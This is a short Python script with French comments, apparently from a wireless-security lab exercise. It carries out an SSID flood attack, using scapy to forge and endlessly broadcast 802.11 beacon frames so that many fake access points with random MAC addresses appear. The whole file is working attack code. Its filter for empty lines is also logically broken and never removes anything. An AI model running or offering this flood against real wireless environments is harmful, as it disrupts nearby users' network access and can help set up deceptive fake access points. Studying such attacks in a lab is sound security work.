# Description : Script permettant de créer de faux SSID afin de créer du traffic. 
#               Afin de fonctionner proprement, il faut fournir un fichier contenant les SSID à créer
# Authors     : Géraud SILVESTI, Alexandre JAQUIER, Francesco MONTI
# Date        : 28.03.2023
# Usage       : 3_ssidflood.py -i <INTERFACE> [-f <FILE WITH SSID>] [-n <NUMBER OF SSID>]
# Source      : https://www.thepythoncode.com/article/create-fake-access-points-scapy
#             : https://github.com/SkypLabs/probequest

from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp
from threading import Thread
from faker import Faker
from faker_wifi_essid import WifiESSID
import argparse

fake = Faker()
fake.add_provider(WifiESSID)

ssid_list = []

parser = argparse.ArgumentParser(prog="SSID FLOOD", description="SSID Flood attack")

parser.add_argument("-i", "--interface", required=True, help="Interface who sends the attack")
parser.add_argument("-f", "--file", required=False, help="File with all SSID")
parser.add_argument("-n", "--number", required=False, help="Number of SSID to generate (not null and positive)")
args = parser.parse_args()

interface = args.interface

if args.number == None and args.file == None:
    print("You have to specify either a file or a number of SSID to generate")
    exit()
elif args.number != None and args.file != None:
    print("You can't specify a file and a number of SSID to generate")
    exit()

# Génére et envoi de paquets afin de simuler un AP avec SSID et une fausse MAC adresse
def generate_send_beacon(ssid, mac):
    # Forge le paquet avec dot11, le beacon et le SSID
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac) 
    beacon = Dot11Beacon(cap="ESS+privacy") 
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) 
    packet = RadioTap()/dot11/beacon/essid
    sendp(packet, inter=0.1, loop=1, iface=interface, verbose=0)

# Execution du script
if __name__ == "__main__":
    # Generation de SSID si aucun fichier n'est fourni en paramètre
    if args.number != None:
        for i in range(int(args.number)):
            ssid_list.append(fake.wifi_essid())
    # Autrement on prend la liste fournie
    else :
        file = open(args.file, "r")
        for line in file:
            # Evite de prendre des SSID avec un nom vide
            if line != "\r\n" or line != "" or line != "\n":
                ssid_list.append(line.rstrip())

    # On démarre un thread pour chaque AP crée afin d'envoyer des paquets
    for ssid_name in ssid_list:
        print(ssid_name)
        Thread(target=generate_send_beacon, args=(ssid_name, Faker().mac_address())).start()